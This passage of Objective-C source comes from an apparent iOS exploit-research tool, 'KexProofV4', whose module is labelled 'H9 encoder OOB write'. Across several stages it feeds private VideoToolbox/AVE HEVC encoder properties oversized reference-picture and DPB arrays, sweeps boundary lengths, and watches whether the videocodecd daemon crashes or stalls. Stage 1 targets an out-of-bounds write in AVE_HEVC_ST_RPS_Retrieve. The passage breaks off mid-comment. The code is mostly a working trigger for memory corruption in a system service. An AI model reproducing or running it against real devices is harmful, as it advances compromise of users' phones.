        KPH9OutAppend(log, @"  dpb[%@] set=%d prep=%d rb=%@ enc=%d/%d cbs=%d | cb1: %s | cbPost(#%d): %s\n",
                      label, (int)setSt, (int)prepSt, rbStr,
                      (int)e0, (int)e1, res->cbCount, res->first, res->targetIdx, postCb);
    }
    KPH9SafeTeardownEx(session, NULL, res);
}

static void Stage7DumpSupportedProperties(NSMutableString *log) {
    KPH9OutAppend(log, @"  [7A: VTSessionCopySupportedPropertyDictionary & Default Value Schema]\n");
    VTCompressionSessionRef session = NULL;
    NSDictionary *spec = @{ @"EnableUserRefForFacetime": @YES };
    if (VTCompressionSessionCreate(kCFAllocatorDefault, 192, 144, kCMVideoCodecType_HEVC,
                                   (__bridge CFDictionaryRef)spec, NULL, NULL,
                                   NULL, NULL, &session) != noErr || !session) {
        KPH9OutAppend(log, @"  supportedProps: session create failed\n");
        return;
    }
    VTSessionSetProperty(session, CFSTR("EnableUserRefForFacetime"), kCFBooleanTrue);
    VTSessionSetProperty(session, CFSTR("EnableMultiReferenceP"), kCFBooleanTrue);
    CFDictionaryRef supp = NULL;
    OSStatus st = VTSessionCopySupportedPropertyDictionary(session, &supp);
    if (st == noErr && supp) {
        NSDictionary *nsSupp = (__bridge NSDictionary *)supp;
        NSArray *allKeys = [[nsSupp allKeys] sortedArrayUsingSelector:@selector(compare:)];
        KPH9OutAppend(log, @"  supportedProps total=%lu\n", (unsigned long)allKeys.count);
        for (NSString *k in allKeys) {
            NSString *kl = [k lowercaseString];
            if ([kl containsString:@"facetime"] || [kl containsString:@"rps"] ||
                [kl containsString:@"dpb"] || [kl containsString:@"ref"] ||
                [kl containsString:@"temporal"] || [kl containsString:@"layer"] ||
                [kl containsString:@"usage"] || [kl containsString:@"ltr"] ||
                [kl containsString:@"ack"] || [kl containsString:@"base"] ||
                [kl containsString:@"force"] || [kl containsString:@"slice"] ||
                [kl containsString:@"ichat"] || [kl containsString:@"param"] ||
                [kl containsString:@"str"] || [kl containsString:@"gop"] ||
                [kl containsString:@"frame"]) {
                id meta = nsSupp[k];
                NSString *metaStr = [[meta description] stringByReplacingOccurrencesOfString:@"\n" withString:@" "];
                while ([metaStr containsString:@"  "]) {
                    metaStr = [metaStr stringByReplacingOccurrencesOfString:@"  " withString:@" "];
                }
                CFTypeRef curVal = NULL;
                OSStatus cpSt = VTSessionCopyProperty(session, (__bridge CFStringRef)k, kCFAllocatorDefault, &curVal);
                NSString *curDesc = @"none";
                if (cpSt == noErr && curVal) {
                    curDesc = [NSString stringWithFormat:@"%@(tid=%lu)",
                               [[(__bridge id)curVal description] stringByReplacingOccurrencesOfString:@"\n" withString:@" "],
                               (unsigned long)CFGetTypeID(curVal)];
                    CFRelease(curVal);
                } else {
                    curDesc = [NSString stringWithFormat:@"err=%d", (int)cpSt];
                }
                KPH9OutAppend(log, @"    prop[%@] cur=%@ meta=%@\n", k, curDesc, metaStr);
            }
        }
        CFRelease(supp);
    } else {
        KPH9OutAppend(log, @"  supportedProps err=%d\n", (int)st);
    }
    KPH9SafeTeardown(session);
}

static void RunStage7_MalfunctionMatrix(NSMutableString *log) {
    KPH9OutAppend(log, @"\n--- Stage 7: Supported Props Schema, Post-IDR DPB Updates & UserRPS Session Schema ---\n");
    CVPixelBufferRef px = CreateDummyNV12Buffer(192, 144);
    if (!px) {
        KPH9OutAppend(log, @"  [!] Failed to allocate CVPixelBuffer\n");
        return;
    }

    // 7A: Dump supported property schema from H9 over XPC + safe read-only hidden AVE property probe
    // WARNING: Never blindly call VTSessionSetProperty with kCFBooleanTrue / CFNumber / CFString
    // on untyped hidden properties (e.g. UserParameterSetsIds expects CFArray, DPBRequirements
    // expects CFDictionary) — type mismatch triggers an uncaught NSInvalidArgumentException
    // (SIGABRT) in videocodecd and locks it into launchd's 320s respawn throttle!
    Stage7DumpSupportedProperties(log);
    {
        VTCompressionSessionRef hs = NULL;
        NSDictionary *hspec = @{ @"EnableUserRefForFacetime": @YES };
        if (VTCompressionSessionCreate(kCFAllocatorDefault, 192, 144, kCMVideoCodecType_HEVC,
                                       (__bridge CFDictionaryRef)hspec, NULL, NULL, NULL, NULL, &hs) == noErr && hs) {
            NSArray *hiddenProps = @[
                @"ForceSliceRPS", @"DPBNumberOfFrames", @"DPBAllocateRVRABuffers",
                @"FTUsageType", @"UseLongTermReference", @"iChatUsageString",
                @"DPBRequirements", @"UserParameterSetsIds"
            ];
            for (NSString *hp in hiddenProps) {
                CFTypeRef val = NULL;
                OSStatus cpSt = VTSessionCopyProperty(hs, (__bridge CFStringRef)hp, kCFAllocatorDefault, &val);
                NSString *valStr = @"none";
                if (cpSt == noErr && val) {
                    valStr = [NSString stringWithFormat:@"%@(tid=%lu)",
                              [[(__bridge id)val description] stringByReplacingOccurrencesOfString:@"\n" withString:@" "],
                              (unsigned long)CFGetTypeID(val)];
                    CFRelease(val);
                }
                KPH9OutAppend(log, @"    hidden[%@] copy=%d(%@)\n", hp, (int)cpSt, valStr);
            }
            KPH9SafeTeardown(hs);
        }
        // Resolve private VideoToolbox CFStringRef constants via dlsym
        const char *vtSyms[] = {
            "kVTCompressionPropertyKey_DPBRequirements",
            "kVTDPBRequirements_NumberOfFrames",
            "kVTDPBRequirements_AllocateRVRABuffers",
            "kVTCompressionPropertyKey_UserDPBFramesForFaceTime",
            "kVTCompressionPropertyKey_UserRPSForFaceTime",
            "kVTEncodeFrameOptionKey_SetDPB",
            "kVTEncodeFrameOptionKey_DPB_ReferenceFrames",
            "kVTEncodeFrameOptionKey_DPB_FrameNumberFromIDR",
            "kVTEncodeFrameOptionKey_DPB_LongTermFrameNumberFromIDR",
            "kVTEncodeFrameOptionKey_DPB_HowManyShortTermFromIDR",
            "kVTEncodeFrameOptionKey_DPB_NumberOfReferenceFrames",
            "kVTSampleAttachment_GetDPB",
        };
        NSMutableArray *symParts = [NSMutableArray array];
        for (size_t si = 0; si < sizeof(vtSyms) / sizeof(vtSyms[0]); si++) {
            CFStringRef *symPtr = (CFStringRef *)dlsym(RTLD_DEFAULT, vtSyms[si]);
            if (symPtr && *symPtr) {
                [symParts addObject:[NSString stringWithFormat:@"%s=%@", vtSyms[si], (__bridge NSString *)(*symPtr)]];
            } else {
                [symParts addObject:[NSString stringWithFormat:@"%s=NULL", vtSyms[si]]];
            }
        }
        KPH9OutAppend(log, @"    vtSyms: %@\n", [symParts componentsJoinedByString:@" | "]);
    }

    // 7B: DPB matrix with LIVE ENCODED IOSurfaceIDs (analyst: SetDPBSnapShot
    // accepts only surfaces already passed through EncodeFrame in this session).
    KPH9OutAppend(log, @"  [7B: DPB Matrix with live encoded IOSurfaceIDs (4..34 elements = 2..17 pairs)]\n");
    NSMutableArray *stage7Holders = [NSMutableArray array];
    NSArray<NSNumber *> *stage7PoolIDs = KPH9AllocSurfacePool(17, 192, 144, stage7Holders);
    uint32_t sid0 = stage7PoolIDs[0].unsignedIntValue;
    uint32_t sid1 = stage7PoolIDs[1].unsignedIntValue;
    KPH9OutAppend(log, @"  [surf pool] sid0=0x%x sid1=0x%x pool[0..2]=%u,%u,%u\n",
                  sid0, sid1,
                  stage7PoolIDs[0].unsignedIntValue,
                  stage7PoolIDs[1].unsignedIntValue,
                  stage7PoolIDs[2].unsignedIntValue);
    NSMutableArray *zero32 = [NSMutableArray arrayWithCapacity:32];
    for (int i = 0; i < 32; i++) [zero32 addObject:@0];
    NSMutableArray *zero34 = [NSMutableArray arrayWithCapacity:34];
    for (int i = 0; i < 34; i++) [zero34 addObject:@0];
    NSMutableArray *surfPairs32 = [NSMutableArray arrayWithCapacity:32];
    for (int p = 0; p < 16; p++) {
        // Первые 5 буферов пула реально проходят через EncodeFrame в режиме @post-4p
        [surfPairs32 addObject:stage7PoolIDs[(NSUInteger)(p % 5)]];
        [surfPairs32 addObject:@0];
    }
    NSMutableArray *surfPairs34 = [NSMutableArray arrayWithCapacity:34];
    for (int p = 0; p < 17; p++) {
        [surfPairs34 addObject:stage7PoolIDs[(NSUInteger)(p % 5)]];
        [surfPairs34 addObject:@0];
    }
    NSMutableArray *zero32PlusLastSurfPair = [zero32 mutableCopy];
    [zero32PlusLastSurfPair addObject:@(sid0)];
    [zero32PlusLastSurfPair addObject:@0];

    Stage7RunCustomDPBArrayPool(log, stage7Holders, @"x4 (0,0,0,0)@pre",            @[ @0, @0, @0, @0 ],           0, NO);
    Stage7RunCustomDPBArrayPool(log, stage7Holders, @"x32 allZero@pre",             zero32,                        0, NO);
    Stage7RunCustomDPBArrayPool(log, stage7Holders, @"x34 allZero@pre",             zero34,                        0, NO);
    Stage7RunCustomDPBArrayPool(log, stage7Holders, @"x4 (sid0,0,sid1,0)@post-idr", @[ @(sid0), @0, @(sid1), @0 ], 3, YES);
    Stage7RunCustomDPBArrayPool(log, stage7Holders, @"x4 (sid0,0,sid1,0)@post-4p",  @[ @(sid0), @0, @(sid1), @0 ], 4, YES);
    Stage7RunCustomDPBArrayPool(log, stage7Holders, @"x32 surfPairs@post-4p",       surfPairs32,                   4, YES);
    Stage7RunCustomDPBArrayPool(log, stage7Holders, @"x34 surfPairs@post-4p",       surfPairs34,                   4, YES);
    Stage7RunCustomDPBArrayPool(log, stage7Holders, @"x34 zero32+surfPair16@post-4p", zero32PlusLastSurfPair,     4, YES);

    // 7C: Pair boundary (x32/x34/x36) with live encoded surf IDs @post-4p
    // (flat UserRPS stays removed — SIGABRT in videocodecd).
    KPH9OutAppend(log, @"  [7C: UserDPBFramesForFaceTime Pair Boundary (x32, x34, x36) @post-4p]\n");
    int dpbPairLens[] = { 32, 34, 36 };
    for (size_t di = 0; di < sizeof(dpbPairLens) / sizeof(dpbPairLens[0]); di++) {
        int len = dpbPairLens[di];
        NSMutableArray *pairArr = [NSMutableArray arrayWithCapacity:(NSUInteger)len];
        for (int k = 0; k < len; k += 2) {
            NSUInteger pairIdx = (NSUInteger)(k / 2) % 5;
            [pairArr addObject:stage7PoolIDs[pairIdx]];
            [pairArr addObject:@0];
        }
        NSString *lbl = [NSString stringWithFormat:@"x%d surfPairs@post-4p", len];
        Stage7RunCustomDPBArrayPool(log, stage7Holders, lbl, pairArr, 4, YES);
    }

    // 7D: DPBRequirements schema (@pre CFDictionary vs CFArray) & SetDPB structured dictionary check at cb#6
    KPH9OutAppend(log, @"  [7D: DPBRequirements Schema (CFDictionary vs CFArray) & Structured SetDPB Check @post-4p]\n");
    int reqCounts[] = { 4, 16, 17, 18, 24 };
    for (size_t ri = 0; ri < sizeof(reqCounts) / sizeof(reqCounts[0]); ri++) {
        int rn = reqCounts[ri];
        NSDictionary *reqSingleDict0 = @{
            @"NumberOfFrames": @(rn),
            @"AllocateRVRABuffers": (id)kCFBooleanFalse,
        };
        NSDictionary *reqSingleDict1 = @{
            @"NumberOfFrames": @(rn),
            @"AllocateRVRABuffers": (id)kCFBooleanTrue,
        };
        NSMutableArray *reqArr = [NSMutableArray arrayWithCapacity:(NSUInteger)rn];
        NSMutableArray *reqDictArr = [NSMutableArray arrayWithCapacity:(NSUInteger)rn];
        for (int k = 0; k < rn; k++) {
            [reqArr addObject:@((k % 16) + 1)];
            [reqDictArr addObject:@{
                @"NumberOfFrames": @((k % 16) + 1),
                @"AllocateRVRABuffers": (id)kCFBooleanFalse,
            }];
        }

        // 1) Pre-prepare check (RealTime=NO, AllowFrameReordering=YES)
        OSStatus stPreNum = -999, stPreDict0 = -999, stPreDict1 = -999;
        NSString *preRbDesc = @"none";
        {
            VTCompressionSessionRef ps = NULL;
            if (VTCompressionSessionCreate(kCFAllocatorDefault, 192, 144, kCMVideoCodecType_HEVC,
                                           NULL, NULL, NULL, NULL, NULL, &ps) == noErr && ps) {
                VTSessionSetProperty(ps, kVTCompressionPropertyKey_RealTime, kCFBooleanFalse);
                VTSessionSetProperty(ps, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanTrue);
                stPreDict0 = VTSessionSetProperty(ps, CFSTR("DPBRequirements"), (__bridge CFTypeRef)reqSingleDict0);
                stPreDict1 = VTSessionSetProperty(ps, CFSTR("DPBRequirements"), (__bridge CFTypeRef)reqSingleDict1);
                stPreNum = VTSessionSetProperty(ps, CFSTR("DPBRequirements"), (__bridge CFTypeRef)reqArr);
                CFTypeRef reqRb = NULL;
                OSStatus cpReq = VTSessionCopyProperty(ps, CFSTR("DPBRequirements"), kCFAllocatorDefault, &reqRb);
                if (cpReq == noErr && reqRb) {
                    if (CFGetTypeID(reqRb) == CFArrayGetTypeID()) {
                        preRbDesc = [NSString stringWithFormat:@"arr(%ld)", (long)CFArrayGetCount((CFArrayRef)reqRb)];
                    } else if (CFGetTypeID(reqRb) == CFDictionaryGetTypeID()) {
                        preRbDesc = [NSString stringWithFormat:@"dict(%ld)", (long)CFDictionaryGetCount((CFDictionaryRef)reqRb)];
                    } else {
                        preRbDesc = [NSString stringWithFormat:@"tid=%lu", (unsigned long)CFGetTypeID(reqRb)];
                    }
                    CFRelease(reqRb);
                } else {
                    preRbDesc = [NSString stringWithFormat:@"err=%d", (int)cpReq];
                }
                KPH9SafeTeardown(ps);
            }
        }

        // 2) @post-4p (5 warm frames -> cb#6 target, identical GOP position to 7B/7C) with dual non-zero IOSurfaceIDs
        Stage6ProbeResult *res = Stage6AllocResult();
        if (!res) continue;
        res->targetIdx = -1;
        VTCompressionSessionRef rs = NULL;
        NSDictionary *rspec = @{ @"EnableUserRefForFacetime": @YES };
        if (VTCompressionSessionCreate(kCFAllocatorDefault, 192, 144, kCMVideoCodecType_HEVC,
                                       (__bridge CFDictionaryRef)rspec, NULL, NULL,
                                       Stage6OutputCallback, res, &rs) == noErr && rs) {
            VTSessionSetProperty(rs, CFSTR("EnableUserRefForFacetime"), kCFBooleanTrue);
            VTSessionSetProperty(rs, CFSTR("EnableMultiReferenceP"), kCFBooleanTrue);
            KPH9PrimeRealTime(rs);
            OSStatus stFtDict = VTSessionSetProperty(rs, CFSTR("DPBRequirements"), (__bridge CFTypeRef)reqSingleDict1);
            OSStatus stFtNum  = VTSessionSetProperty(rs, CFSTR("DPBRequirements"), (__bridge CFTypeRef)reqArr);
            VTCompressionSessionPrepareToEncodeFrames(rs);

            int64_t rpts = 0;
            for (int warm = 0; warm < 5; warm++) {
                CVPixelBufferRef wpb = (__bridge CVPixelBufferRef)stage7Holders[(NSUInteger)warm % stage7Holders.count];
                VTCompressionSessionEncodeFrame(rs, wpb, CMTimeMake(rpts++, 30), kCMTimeInvalid, NULL, NULL, NULL);
            }
            int ww = 0;
            while (res->cbCount < 5 && ww < 120) { usleep(2000); ww += 2; }

            // Fill both elements of each pair (originalSurfaceID, rvraSurfaceID) with live encoded pool IDs (0..4)
            int pairElemCount = (rn <= 17) ? (rn * 2) : 34;
            NSMutableArray *rvraPairs = [NSMutableArray arrayWithCapacity:(NSUInteger)pairElemCount];
            for (int p = 0; p < pairElemCount / 2; p++) {
                [rvraPairs addObject:stage7PoolIDs[(NSUInteger)(p % 5)]];
                [rvraPairs addObject:stage7PoolIDs[(NSUInteger)((p + 1) % 5)]];
            }
            OSStatus stDpb = VTSessionSetProperty(rs, CFSTR("UserDPBFramesForFaceTime"), (__bridge CFTypeRef)rvraPairs);
            NSString *dpbRb = Stage7ReadbackDPB(rs);

            // Structured SetDPB frame option dictionary matching kVTEncodeFrameOptionKey_DPB_* keys
            NSMutableArray *refDicts = [NSMutableArray array];
            for (int rf = 0; rf < 2; rf++) {
                [refDicts addObject:@{
                    @"FrameNumber": @(rf),
                    @"ReferenceType": @0,
                    @"IOSurfaceID": stage7PoolIDs[(NSUInteger)rf],
                    @"MSBIOSurfaceID": @0,
                }];
            }
            NSDictionary *setDpbDict = @{
                @"NumberOfReferenceFrames": @2,
                @"FrameNumberFromIDR": @5,
                @"LongTermFrameNumberFromIDR": @0,
                @"HowManyShortTermFromIDR": @2,
                @"DPBReferenceFrames": refDicts,
            };
            res->targetHit = 0;
            res->targetIdx = -1;
            NSDictionary *fp = @{
                @"SetDPB": setDpbDict,
                @"UserDPBFramesForFaceTime": rvraPairs,
                @"NumberOfReferenceFrames": @2,
                @"FrameNumberFromIDR": @5,
                @"HowManyShortTermFromIDR": @2,
                @"DPBReferenceFrames": refDicts,
            };
            CVPixelBufferRef tpb = (__bridge CVPixelBufferRef)stage7Holders[(NSUInteger)rpts % stage7Holders.count];
            OSStatus encT = VTCompressionSessionEncodeFrame(rs, tpb, CMTimeMake(rpts++, 30), kCMTimeInvalid,
                                                            (__bridge CFDictionaryRef)fp, (void *)(uintptr_t)0xCAFE, NULL);
            for (int fl = 0; fl < 4 && !res->targetHit; fl++) {
                CVPixelBufferRef fpb = (__bridge CVPixelBufferRef)stage7Holders[(NSUInteger)rpts % stage7Holders.count];
                VTCompressionSessionEncodeFrame(rs, fpb, CMTimeMake(rpts++, 30), kCMTimeInvalid, NULL, NULL, NULL);
                int sw = 0;
                while (!res->targetHit && sw < 40) { usleep(2000); sw += 2; }
            }
            @synchronized ([KPH9EncoderModule class]) {
                res->closed = 1;
                const char *postCb = res->targetHit ? res->target : res->second;
                KPH9OutAppend(log, @"  dpbReq[n=%-2d] preNum=%d preDict=%d/%d ftDict=%d ftNum=%d rbReq=%@ setDPB(x%d dual)=%d rbDPB=%@ enc=%d | cbPost(#%d): %s\n",
                              rn, (int)stPreNum, (int)stPreDict0, (int)stPreDict1, (int)stFtDict, (int)stFtNum, preRbDesc,
                              pairElemCount, (int)stDpb, dpbRb, (int)encT, res->targetIdx, postCb);
            }
            KPH9SafeTeardownEx(rs, NULL, res);
        } else {
            free(res);
        }
    }

    // 7E: ReadWrite CFArray layer & parameter-set ID properties (confirmed tid=19 in 7A)
    KPH9OutAppend(log, @"  [7E: Layer & Parameter-Set CFArray Properties (tid=19 ReadWrite + UserParameterSetsIds Exact Cutoff)]\n");
    NSArray<NSString *> *arrProps = @[
        @"MVHEVCVideoLayerIDs",
        @"HEVCAuxiliaryLayerIDs",
        @"RequiredMVHEVCSequenceParameterSetIDs",
        @"RequiredMVHEVCPictureParameterSetIDs",
        @"RequiredMVHEVCVideoParameterSetAlphaVideoLayerIDs",
        @"UserParameterSetsIds",
    ];
    NSMutableArray *a16 = [NSMutableArray arrayWithCapacity:16];
    NSMutableArray *a64 = [NSMutableArray arrayWithCapacity:64];
    for (int i = 0; i < 16; i++) [a16 addObject:@(i)];
    for (int i = 0; i < 64; i++) [a64 addObject:@(i % 16)];
    NSArray *shapes = @[
        @[ @"a1",  @[ @0 ] ],
        @[ @"a2",  @[ @0, @1 ] ],
        @[ @"a3",  @[ @0, @1, @2 ] ],
        @[ @"a4",  @[ @0, @1, @2, @3 ] ],
        @[ @"a16", a16 ],
        @[ @"a64", a64 ],
    ];
    for (NSString *propName in arrProps) {
        VTCompressionSessionRef as = NULL;
        NSDictionary *aspec = @{ @"EnableUserRefForFacetime": @YES };
        if (VTCompressionSessionCreate(kCFAllocatorDefault, 192, 144, kCMVideoCodecType_HEVC,
                                       (__bridge CFDictionaryRef)aspec, NULL, NULL,
                                       NULL, NULL, &as) == noErr && as) {
            NSMutableArray *resParts = [NSMutableArray array];
            for (NSArray *pair in shapes) {
                NSString *tag = pair[0];
                NSArray *val = pair[1];
                OSStatus st = VTSessionSetProperty(as, (__bridge CFStringRef)propName, (__bridge CFTypeRef)val);
                CFTypeRef rb = NULL;
                CFIndex rbCnt = -1;
                if (VTSessionCopyProperty(as, (__bridge CFStringRef)propName, kCFAllocatorDefault, &rb) == noErr && rb) {
                    if (CFGetTypeID(rb) == CFArrayGetTypeID()) rbCnt = CFArrayGetCount((CFArrayRef)rb);
                    CFRelease(rb);
                }
                [resParts addObject:[NSString stringWithFormat:@"%@=%d(rb=%ld)", tag, (int)st, (long)rbCnt]];
            }
            KPH9OutAppend(log, @"  arrProp[%@]: %@\n", propName, [resParts componentsJoinedByString:@" "]);
            KPH9SafeTeardown(as);
        }
    }

    // Exact element-count & element-value boundary for UserParameterSetsIds
    {
        VTCompressionSessionRef ps = NULL;
        NSDictionary *pspec = @{ @"EnableUserRefForFacetime": @YES };
        if (VTCompressionSessionCreate(kCFAllocatorDefault, 192, 144, kCMVideoCodecType_HEVC,
                                       (__bridge CFDictionaryRef)pspec, NULL, NULL,
                                       NULL, NULL, &ps) == noErr && ps) {
            int psLens[] = { 1, 2, 3, 4, 8, 15, 16, 17, 18, 24, 32, 33, 34, 48, 64 };
            NSMutableArray *lenParts = [NSMutableArray array];
            for (size_t li = 0; li < sizeof(psLens) / sizeof(psLens[0]); li++) {
                int ln = psLens[li];
                NSMutableArray *arr = [NSMutableArray arrayWithCapacity:(NSUInteger)ln];
                for (int k = 0; k < ln; k++) [arr addObject:@(k % 16)];
                OSStatus st = VTSessionSetProperty(ps, CFSTR("UserParameterSetsIds"), (__bridge CFTypeRef)arr);
                CFTypeRef rb = NULL;
                CFIndex rbCnt = -1;
                if (VTSessionCopyProperty(ps, CFSTR("UserParameterSetsIds"), kCFAllocatorDefault, &rb) == noErr && rb) {
                    if (CFGetTypeID(rb) == CFArrayGetTypeID()) rbCnt = CFArrayGetCount((CFArrayRef)rb);
                    CFRelease(rb);
                }
                [lenParts addObject:[NSString stringWithFormat:@"n%d=%d(rb=%ld)", ln, (int)st, (long)rbCnt]];
            }
            KPH9OutAppend(log, @"  UserParameterSetsIds[len]: %@\n", [lenParts componentsJoinedByString:@" "]);

            int psVals[] = { 0, 1, 3, 7, 15, 16, 31, 32, 63, 64, 255, 256, 65792, -1 };
            NSMutableArray *valParts = [NSMutableArray array];
            for (size_t vi = 0; vi < sizeof(psVals) / sizeof(psVals[0]); vi++) {
                int v = psVals[vi];
                NSArray *arr = @[ @(v), @0, @0, @0 ];
                OSStatus st = VTSessionSetProperty(ps, CFSTR("UserParameterSetsIds"), (__bridge CFTypeRef)arr);
                [valParts addObject:[NSString stringWithFormat:@"v%d=%d", v, (int)st]];
            }
            KPH9OutAppend(log, @"  UserParameterSetsIds[val x4]: %@\n", [valParts componentsJoinedByString:@" "]);
            KPH9SafeTeardown(ps);
        }
    }

    // Encode probe with MVHEVCVideoLayerIDs=[0,1] + RequiredMVHEVC*=[0,1] + UserParameterSetsIds=a16
    {
        Stage6ProbeResult *mvRes = Stage6AllocResult();
        if (mvRes) {
            VTCompressionSessionRef ms = NULL;
            NSDictionary *mspec = @{ @"EnableUserRefForFacetime": @YES };
            if (VTCompressionSessionCreate(kCFAllocatorDefault, 192, 144, kCMVideoCodecType_HEVC,
                                           (__bridge CFDictionaryRef)mspec, NULL, NULL,
                                           Stage6OutputCallback, mvRes, &ms) == noErr && ms) {
                VTSessionSetProperty(ms, CFSTR("EnableUserRefForFacetime"), kCFBooleanTrue);
                VTSessionSetProperty(ms, CFSTR("EnableMultiReferenceP"), kCFBooleanTrue);
                KPH9PrimeRealTime(ms);
                OSStatus stL = VTSessionSetProperty(ms, CFSTR("MVHEVCVideoLayerIDs"), (__bridge CFTypeRef)@[ @0, @1 ]);
                OSStatus stS = VTSessionSetProperty(ms, CFSTR("RequiredMVHEVCSequenceParameterSetIDs"), (__bridge CFTypeRef)@[ @0, @1 ]);
                OSStatus stP = VTSessionSetProperty(ms, CFSTR("RequiredMVHEVCPictureParameterSetIDs"), (__bridge CFTypeRef)@[ @0, @1 ]);
                OSStatus stU = VTSessionSetProperty(ms, CFSTR("UserParameterSetsIds"), (__bridge CFTypeRef)a16);
                OSStatus prep = VTCompressionSessionPrepareToEncodeFrames(ms);
                OSStatus enc = VTCompressionSessionEncodeFrame(ms, px, CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
                int w0 = 0;
                while (mvRes->cbCount < 1 && w0 < 80) { usleep(2000); w0 += 2; }
                @synchronized ([KPH9EncoderModule class]) {
                    mvRes->closed = 1;
                    KPH9OutAppend(log, @"  mvHevc+psIds16: L=%d S=%d P=%d U16=%d prep=%d enc=%d | %s\n",
                                  (int)stL, (int)stS, (int)stP, (int)stU, (int)prep, (int)enc, mvRes->first);
                }
                KPH9SafeTeardownEx(ms, NULL, mvRes);
            } else {
                free(mvRes);
            }
        }
    }

    CVPixelBufferRelease(px);
}

static CVPixelBufferRef KPH9CreatePixelBuffer(int width, int height) {
    CVPixelBufferRef pb = NULL;
    NSDictionary *attrs = @{
        (id)kCVPixelBufferIOSurfacePropertiesKey : @{}
    };
    if (CVPixelBufferCreate(kCFAllocatorDefault, width, height,
                            kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
                            (__bridge CFDictionaryRef)attrs, &pb) == kCVReturnSuccess && pb) {
        CVPixelBufferLockBaseAddress(pb, 0);
        memset(CVPixelBufferGetBaseAddressOfPlane(pb, 0), 0x40,
               CVPixelBufferGetBytesPerRowOfPlane(pb, 0) * (size_t)height);
        memset(CVPixelBufferGetBaseAddressOfPlane(pb, 1), 0x80,
               CVPixelBufferGetBytesPerRowOfPlane(pb, 1) * ((size_t)height / 2));
        CVPixelBufferUnlockBaseAddress(pb, 0);
    }
    return pb;
}

// Executes a VideoToolbox stage on a detached queue with a hard wall-clock
// timeout and a live-shared output buffer so partial progress is NEVER lost
// even if a step inside the stage stalls.
static NSString *KPH9RunTimed(NSString *label, int64_t timeoutMs, BOOL *outTimedOut, void (^block)(NSMutableString *out)) {
    NSMutableString *liveOut = [NSMutableString string];
    dispatch_semaphore_t sem = dispatch_semaphore_create(0);
    dispatch_queue_t q = dispatch_queue_create("com.stealth.kexproofv4.h9.stage", DISPATCH_QUEUE_CONCURRENT);
    dispatch_async(q, ^{
        @try {
            if (block) block(liveOut);
        } @catch (NSException *ex) {
            KPH9OutAppend(liveOut, @"  [EXCEPTION in %@: %@]\n", label, ex.reason);
        }
        dispatch_semaphore_signal(sem);
    });
    dispatch_time_t deadline = dispatch_time(DISPATCH_TIME_NOW, timeoutMs * (int64_t)NSEC_PER_MSEC);
    if (dispatch_semaphore_wait(sem, deadline) != 0) {
        BOOL alive = KPH9IsVideoCodecdAlive();
        if (outTimedOut) *outTimedOut = !alive;
        NSString *partial = nil;
        @synchronized (liveOut) {
            partial = [liveOut copy];
        }
        return [NSString stringWithFormat:
                @"%@  [TIMEOUT %lld ms in %@ — videocodecd XPC %@]\n",
                partial ?: @"", timeoutMs, label,
                alive ? @"ALIVE (stage-local stall only; continuing)" : @"UNRESPONSIVE / THROTTLED"];
    }
    if (outTimedOut) *outTimedOut = NO;
    @synchronized (liveOut) {
        return [liveOut copy];
    }
}

@interface KPH9EncoderModule ()
@property (nonatomic, copy) NSString *identifier;
@property (nonatomic, copy) NSString *title;
@property (nonatomic, copy) NSString *subtitle;
@property (nonatomic, copy) NSString *icon;
@property (nonatomic, assign) KPTestSection section;
@end

@implementation KPH9EncoderModule

- (instancetype)initWithNameSweep {
    self = [super init];
    if (self) {
        _identifier = @"h9encoder.oob";
        _title = @"H9 encoder OOB write";
        _subtitle = @"AVE_HEVC_ST_RPS_Retrieve & DPB/NTL audit (bounded XPC)";
        _icon = @"video";
        _section = KPTestSectionKernelProbes;
    }
    return self;
}

- (void)resetJournal {
    NSString *path = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject
                      stringByAppendingPathComponent:@"kp-h9-journal.log"];
    [[NSFileManager defaultManager] createFileAtPath:path contents:[NSData data] attributes:nil];
}

- (void)journal:(NSString *)line {
    NSString *path = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject
                      stringByAppendingPathComponent:@"kp-h9-journal.log"];
    NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:path];
    if (!fh) {
        [[NSFileManager defaultManager] createFileAtPath:path contents:nil attributes:nil];
        fh = [NSFileHandle fileHandleForWritingAtPath:path];
    }
    [fh seekToEndOfFile];
    [fh writeData:[[line stringByAppendingString:@"\n"] dataUsingEncoding:NSUTF8StringEncoding]];
    [fh synchronizeFile];
    [fh closeFile];
    [KPLog.shared appendFormat:@"[h9] %@", line];
}

- (NSString *)runReport {
    [self resetJournal];
    [self journal:@"=== H9 clean rebuild start ==="];

    NSMutableString *report = [NSMutableString string];
    [report appendString:@"=== KexProofV4 · H9 Encoder OOB Write (Clean Rebuild) ===\n"];
    [report appendFormat:@"Target: iOS %@ uid=%d pid=%d\n",
     UIDevice.currentDevice.systemVersion, getuid(), getpid()];

    BOOL vtHung = NO;

    // -------------------------------------------------------------------------
    // Stage 1: AVE_HEVC_ST_RPS_Retrieve (UserRPSForFaceTime 2+2 vs 32+32 OOB)
    // -------------------------------------------------------------------------
    [self journal:@"Stage 1: RPS OOB probe"];
    [report appendString:@"\n--- Stage 1: AVE_HEVC_ST_RPS_Retrieve (UserRPSForFaceTime) ---\n"];
    NSString *s1 = KPH9RunTimed(@"Stage1-RPS", 5000, &vtHung, ^(NSMutableString *out) {
        NSMutableArray *cbSink = [NSMutableArray array];
        CFTypeRef retainedSink = CFRetain((__bridge CFTypeRef)cbSink);
        NSDictionary *spec = @{ @"EnableUserRefForFacetime": @YES };
        VTCompressionSessionRef s = NULL;
        OSStatus st = VTCompressionSessionCreate(kCFAllocatorDefault, 1280, 720,
                                                 kCMVideoCodecType_HEVC,
                                                 (__bridge CFDictionaryRef)spec,
                                                 NULL, NULL, KPH9AttsCB,
                                                 (void *)retainedSink, &s);
        KPH9OutAppend(out, @"  session create -> %d\n", (int)st);
        if (st != noErr || !s) {
            CFRelease(retainedSink);
            return;
        }

        VTSessionSetProperty(s, CFSTR("EnableUserRefForFacetime"), kCFBooleanTrue);
        VTSessionSetProperty(s, CFSTR("EnableMultiReferenceP"), kCFBooleanTrue);
        KPH9PrimeRealTime(s);

        // Схема ветки InterRefPicSetPredictionFlag = false в AVE_HEVC_ST_RPS_Retrieve:
        // проверяем массив NSNumber (@1/@0) для UsedByCurrPicS0/S1 и 16-элементное дополнение,
